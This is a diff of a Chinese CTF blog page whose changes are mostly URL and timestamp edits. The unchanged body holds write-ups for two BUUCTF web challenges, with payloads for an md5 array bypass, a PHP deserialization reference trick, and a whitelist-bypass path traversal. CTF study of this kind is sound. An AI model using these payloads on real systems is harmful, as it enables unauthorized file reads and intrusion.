@@ -9,7 +9,7 @@
 <meta name="description" content="很抱歉，您所访问的地址并不存在 点击返回首页">
 <meta property="og:type" content="website">
 <meta property="og:title" content="404">
-<meta property="og:url" content="http://yoursite.com/404.html">
+<meta property="og:url" content="https://sijiu.ren.com/404.html">
 <meta property="og:site_name" content="CTF技术笔记">
 <meta property="og:description" content="很抱歉，您所访问的地址并不存在 点击返回首页">
 <meta property="og:locale" content="zh_CN">
@@ -357,7 +357,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2022-11-02 15:48:35'>2021-03-17 14:38</time>
+        创建时间:<time class="date" title='更新时间: 2022-12-08 11:05:43'>2021-03-17 14:38</time>
         
     </div>
     <div class="article-meta">
@@ -396,21 +396,21 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>BUU的做题笔记</p>
-<h2 id="BUU-CODE-REVIEW-11传送门"><a href="#BUU-CODE-REVIEW-11传送门" class="headerlink" title="BUU CODE REVIEW 11传送门"></a>BUU CODE REVIEW 11<a href="https://buuoj.cn/challenges#BUU%20CODE%20REVIEW%201" target="_blank" rel="noopener">传送门</a></h2><p><img src="https://cdn.sijiu.ren/blog/20210317/10do5cxYd1Oz.png?imageslim" alt></p>
+<h2 id="BUU-CODE-REVIEW-11传送门"><a href="#BUU-CODE-REVIEW-11传送门" class="headerlink" title="BUU CODE REVIEW 11传送门"></a>BUU CODE REVIEW 11<a href="https://buuoj.cn/challenges#BUU%20CODE%20REVIEW%201" target="_blank" rel="noopener">传送门</a></h2><p><img src="http://cdn.sijiu.ren/blog/20210317/10do5cxYd1Oz.png?imageslim" alt></p>
 <p>审计代码可以发现想要得到flag必须满足</p>
 <p>1.pleaseget等于1</p>
 <p>2.pleasepost等于2</p>
 <p>3.md51和md52的md5值相等且md51和md52的值不相等</p>
 <p>4.反序列化obj</p>
 <p>payload</p>
-<pre><code>pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</code></pre><p><img src="https://cdn.sijiu.ren/blog/20210317/8iIQ4dsta4yl.png?imageslim" alt></p>
+<pre><code>pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</code></pre><p><img src="http://cdn.sijiu.ren/blog/20210317/8iIQ4dsta4yl.png?imageslim" alt></p>
 <p>序列化构造方法</p>
-<p><img src="https://cdn.sijiu.ren/blog/20210317/qoSXaVobPpNb.png?imageslim" alt></p>
+<p><img src="http://cdn.sijiu.ren/blog/20210317/qoSXaVobPpNb.png?imageslim" alt></p>
 <h2 id="HCTF-2018-WarmUp1-传送门"><a href="#HCTF-2018-WarmUp1-传送门" class="headerlink" title="[HCTF 2018]WarmUp1 传送门"></a>[HCTF 2018]WarmUp1 <a href="https://buuoj.cn/challenges#[HCTF%202018]WarmUp" target="_blank" rel="noopener">传送门</a></h2><p>查看页面源代码</p>
-<p><img src="https://cdn.sijiu.ren/blog/20210317/4TB8EL2NzUSl.png?imageslim" alt></p>
+<p><img src="http://cdn.sijiu.ren/blog/20210317/4TB8EL2NzUSl.png?imageslim" alt></p>
 <p>访问source.php</p>
-<p><img src="https://cdn.sijiu.ren/blog/20210317/Q7krkxpQt722.png?imageslim" alt></p>
-<p><img src="https://cdn.sijiu.ren/blog/20210317/0g9lh2e5eCM9.png?imageslim" alt></p>
+<p><img src="http://cdn.sijiu.ren/blog/20210317/Q7krkxpQt722.png?imageslim" alt></p>
+<p><img src="http://cdn.sijiu.ren/blog/20210317/0g9lh2e5eCM9.png?imageslim" alt></p>
 <p>查看源码</p>
 <pre><code>! empty //要求变量不为空
 is_string  //要求传参的数值为字符型的
@@ -422,11 +422,11 @@ in_array($page, $whitelist) //要求传递进来的值与$whitelist的值匹配
 mb_substr($page,0,mb_strpos($page . &#39;?&#39;, &#39;?&#39;)) //取传递进来的值的第一位开始到出现?结束如果没?则全部</code></pre><p>可以看到$whitelist的值只有source.php和hint.php</p>
 <p>访问</p>
 <pre><code>http://c3a077b0-eb2a-4aed-99af-463e018bd390.node3.buuoj.cn/source.php/?file=hint.php</code></pre><p>得到提示</p>
-<p><img src="https://cdn.sijiu.ren/blog/20210317/WnP6YJJMPaRY.png?imageslim" alt></p>
+<p><img src="http://cdn.sijiu.ren/blog/20210317/WnP6YJJMPaRY.png?imageslim" alt></p>
 <p>flag在ffffllllaaaagggg里面</p>
 <p>构造获取flag的语句</p>
 <p>payload </p>
-<pre><code>http://c3a077b0-eb2a-4aed-99af-463e018bd390.node3.buuoj.cn/?file=hint.php?../../../../../ffffllllaaaagggg</code></pre><p><img src="https://cdn.sijiu.ren/blog/20210317/5N3CLF6OeAnK.png?imageslim" alt></p>
+<pre><code>http://c3a077b0-eb2a-4aed-99af-463e018bd390.node3.buuoj.cn/?file=hint.php?../../../../../ffffllllaaaagggg</code></pre><p><img src="http://cdn.sijiu.ren/blog/20210317/5N3CLF6OeAnK.png?imageslim" alt></p>
 <p>虽然在checkFile函数中对file的值进行了一系列处理，但是并没有影响到file真正的值，因为在使用处理后的file进行白名单匹配的时候，都是使用了一个新的变量接受file的值，而并没有直接影响file本来的值，所以file的值依旧为</p>
 <pre><code>file=hint.php?../../../../../ffffllllaaaagggg</code></pre>
       
@@ -445,8 +445,8 @@ mb_substr($page,0,mb_strpos($page . &#39;?&#39;, &#39;?&#39;)) //取传递进来
     
     <p><span class="copy-title">本文作者:</span><a  title="亖 玖">亖 玖</a></p>
     <p><span class="copy-title">发布时间:</span>2021-03-17, 14:38:32</p>
-    <p><span class="copy-title">最后更新:</span>2022-11-02, 15:48:35</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2021/03/17/BUUweb%E7%AC%94%E8%AE%B0/" title="BUUweb笔记">http://yoursite.com/2021/03/17/BUUweb%E7%AC%94%E8%AE%B0/</a>
+    <p><span class="copy-title">最后更新:</span>2022-12-08, 11:05:43</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2021/03/17/BUUweb%E7%AC%94%E8%AE%B0/" title="BUUweb笔记">https://sijiu.ren.com/2021/03/17/BUUweb%E7%AC%94%E8%AE%B0/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
